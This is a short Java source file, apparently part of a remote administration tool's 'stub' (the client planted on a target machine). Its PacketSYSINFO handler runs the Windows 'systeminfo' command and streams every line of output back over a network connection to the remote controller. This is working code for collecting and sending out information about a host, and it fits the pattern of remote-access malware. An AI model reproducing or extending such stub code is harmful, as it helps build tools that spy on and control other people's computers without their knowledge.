package com.redpois0n.stub.packets.incoming;

import java.io.BufferedReader;
import java.io.InputStreamReader;

import com.redpois0n.Connection;
import com.redpois0n.common.OperatingSystem;


public class PacketSYSINFO extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			Process p = Runtime.getRuntime().exec("systeminfo");
			BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

			Connection.writeLine("RAWINFO");
			
			String line;

			while ((line = reader.readLine()) != null) {
				Connection.writeLine(line.trim());
			}

			Connection.writeLine("END");
		}
	}

}
